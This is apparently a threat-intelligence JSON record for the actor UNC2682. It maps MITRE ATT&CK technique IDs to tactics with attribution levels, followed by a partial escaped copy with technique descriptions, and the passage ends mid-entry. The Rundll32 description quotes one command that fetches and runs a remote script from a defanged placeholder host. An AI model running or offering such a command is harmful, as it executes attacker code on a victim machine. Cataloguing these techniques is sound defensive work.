{
  "id": "threat-actor--809563d4-dfe8-530c-8365-6a9a11e011a3",
  "name": "UNC2682",
  "type": "actor-mitre",
  "attack-patterns": {
    "Persistence": [
      {
        "id": "attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Impact": [
      {
        "id": "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b",
        "attribution_scope": "possible"
      }
    ],
    "Lateral Movement": [
      {
        "id": "attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Execution": [
      {
        "id": "attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65",
        "attribution_scope": "possible"
      }
    ],
    "Privilege Escalation": [
      {
        "id": "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5",
            "attribution_scope": "confirmed"
          }
        ]
      }
    ],
    "Resource Development": [],
    "Defense Evasion": [
      {
        "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062",
            "attribution_scope": "possible"
          }
        ]
      }
    ],
    "Credential Access": [
      {
        "id": "attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011",
            "attribution_scope": "confirmed"
          },
          {
            "id": "attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0",
        "attribution_scope": "possible"
      }
    ],
    "Discovery": [
      {
        "id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--29be378d-262d-4e99-b00d-852d573628e6",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475",
        "attribution_scope": "confirmed"
      },
      {
        "id": "attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0",
        "attribution_scope": "possible"
      }
    ],
    "Collection": [
      {
        "id": "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
            "attribution_scope": "possible"
          }
        ]
      }
    ],
    "Initial Access": [
      {
        "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
        "attribution_scope": "confirmed"
      }
    ],
    "Command and Control": [
      {
        "id": "attack-pattern--830c9528-df21-472c-8c14-a036bf17d665",
        "attribution_scope": "possible",
        "sub_techniques": [
          {
            "id": "attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7",
            "attribution_scope": "possible"
          }
        ]
      },
      {
        "id": "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada",
            "attribution_scope": "possible"
          },
          {
            "id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6",
        "attribution_scope": "confirmed",
        "sub_techniques": [
          {
            "id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161",
            "attribution_scope": "confirmed"
          }
        ]
      },
      {
        "id": "attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea",
        "attribution_scope": "possible"
      },
      {
        "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
        "attribution_scope": "possible"
      }
    ]
  },
  "is_publishable": true
}
"{\"threat-actors\": [{\"id\": \"threat-actor--809563d4-dfe8-530c-8365-6a9a11e011a3\", \"name\": \"UNC2682\", \"type\": \"actor-mitre\", \"attack-patterns\": {\"Persistence\": [{\"id\": \"attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--d456de47-a16f-4e46-8980-e67478a12dcb\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5\", \"attribution_scope\": \"confirmed\"}]}], \"Impact\": [{\"id\": \"attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b\", \"attribution_scope\": \"possible\"}], \"Lateral Movement\": [{\"id\": \"attack-pattern--54a649ff-439a-41a4-9856-8d144a2551ba\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6\", \"attribution_scope\": \"confirmed\"}]}], \"Execution\": [{\"id\": \"attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--a9d4b653-6915-42af-98b2-5758c4ceee56\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65\", \"attribution_scope\": \"possible\"}], \"Privilege Escalation\": [{\"id\": \"attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--dfefe2ed-4389-4318-8762-f0272b350a1b\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5\", \"attribution_scope\": \"confirmed\"}]}], \"Resource Development\": [], \"Defense Evasion\": [{\"id\": \"attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--457c7820-d331-465a-915e-42f85500ccc4\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b3d682b6-98f2-4fb0-aa3b-b4df007ca70a\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--deb98323-e13f-4b0c-8d94-175379069062\", \"attribution_scope\": \"possible\"}]}], \"Credential Access\": [{\"id\": \"attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0\", \"attribution_scope\": \"possible\"}], \"Discovery\": [{\"id\": \"attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--8f4a33ec-8b1f-4b80-a2f6-642b2e479580\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--29be378d-262d-4e99-b00d-852d573628e6\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475\", \"attribution_scope\": \"confirmed\"}, {\"id\": \"attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0\", \"attribution_scope\": \"possible\"}], \"Collection\": [{\"id\": \"attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--1e9eb839-294b-48cc-b0d3-c45555a2a004\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c\", \"attribution_scope\": \"possible\"}]}], \"Initial Access\": [{\"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c\", \"attribution_scope\": \"confirmed\"}], \"Command and Control\": [{\"id\": \"attack-pattern--830c9528-df21-472c-8c14-a036bf17d665\", \"attribution_scope\": \"possible\", \"sub_techniques\": [{\"id\": \"attack-pattern--f7827069-0bf2-4764-af4f-23fae0d181b7\", \"attribution_scope\": \"possible\"}]}, {\"id\": \"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--bf176076-b789-408e-8cba-7275e81c0ada\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--c21d5a77-d422-4a69-acd7-2c53c1faa34b\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6\", \"attribution_scope\": \"confirmed\", \"sub_techniques\": [{\"id\": \"attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161\", \"attribution_scope\": \"confirmed\"}]}, {\"id\": \"attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea\", \"attribution_scope\": \"possible\"}, {\"id\": \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\", \"attribution_scope\": \"possible\"}]}, \"is_publishable\": true}], \"attack-patterns\": {\"attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-12-14T16:46:06.044Z\", \"name\": \"Create Account\", \"attack_pattern_identifier\": \"T1136\", \"description\": \"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\\n\\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.\", \"modified\": \"2020-03-24T12:44:28.199Z\", \"id\": \"attack-pattern--e01be9c5-e763-4caf-aeb7-000b416aef67\"}, \"attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:40.542Z\", \"name\": \"Shared Modules\", \"attack_pattern_identifier\": \"T1129\", \"description\": \"Adversaries may abuse shared modules to execute malicious payloads. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like <code>CreateProcess</code>, <code>LoadLibrary</code>, etc. of the Win32 API. (Citation: Wikipedia Windows Library Files)\\n\\nThe module loader can load DLLs:\\n\\n* via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\\n    \\n* via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\\n    \\n* via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\\n    \\n* via <code>&#x3c;file name=\\\"filename.extension\\\" loadFrom=\\\"fully-qualified or relative pathname\\\"&#x3e;</code> in an embedded or external \\\"application manifest\\\". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\\n\\nAdversaries may use this functionality as a way to execute arbitrary code on a victim system. For example, malware may execute share modules to load additional components or features.\", \"modified\": \"2020-03-28T18:14:36.980Z\", \"id\": \"attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65\"}, \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Indirect Command Execution\", \"attack_pattern_identifier\": \"T1202\", \"modified\": \"2020-06-20T22:09:22.559Z\", \"description\": \"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts. (Citation: VectorSec ForFiles Aug 2017) (Citation: Evi1cg Forfiles Nov 2017)\\n\\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.\", \"id\": \"attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e\"}, \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-01-23T18:03:46.248Z\", \"name\": \"Rundll32\", \"attack_pattern_identifier\": \"T1218.011\", \"description\": \"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\\n\\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\\n\\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:https[:]//www[.]example[.]com/malicious.sct\\\")\\\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\", \"modified\": \"2020-06-20T22:31:42.113Z\", \"id\": \"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\"}, \"attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:38:24.334Z\", \"name\": \"Python\", \"attack_pattern_identifier\": \"T1059.006\", \"description\": \"Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\\n\\nPython comes with many built-in packages to interact with the underlying system, such as file operations 